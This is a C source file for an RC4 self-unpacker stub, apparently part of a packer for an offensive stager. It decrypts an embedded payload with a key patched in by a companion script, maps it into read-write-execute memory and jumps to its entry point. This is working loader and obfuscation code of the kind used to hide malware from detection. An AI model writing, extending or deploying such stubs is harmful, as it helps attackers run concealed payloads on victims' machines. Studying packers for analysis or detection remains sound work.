// unpack_stub_rc4.c — RC4 self-unpacker stub.
//
// Decrypts the packed payload (RC4, key from the header) into a fresh RWX
// mapping and jumps to it. See unpack.h for the stub/packer contract.

#include "unpack.h"
#include "rc4.h"

/* In .data; pack_rc4.py patches unpacked_size/packed_size/key. */
static struct unpack_header hdr = {1, 1, {0}};

static void copy_and_decrypt(uint8_t *dst, const uint8_t *src, uint32_t len,
                             const uint8_t *key) {
  for (uint32_t i = 0; i < len; i++)
    dst[i] = src[i];
  rc4_ctx ctx;
  rc4_init(&ctx, key, 16);
  rc4_crypt(&ctx, dst, len);
}

__attribute__((noreturn, used)) void unpack_and_run(void) {
  const uint8_t *src = (const uint8_t *)(&hdr + 1);
  long addr = unpack_mmap(0, hdr.unpacked_size, 7 /* RWX */,
                          0x22 /* MAP_PRIVATE|MAP_ANONYMOUS */, -1, 0);
  if (addr < 0)
    __builtin_trap();

  copy_and_decrypt((uint8_t *)addr, src, hdr.packed_size, hdr.key);

  ((void (*)(void))addr)(); /* original stager _start */
  __builtin_trap();
}

UNPACK_ENTRY();
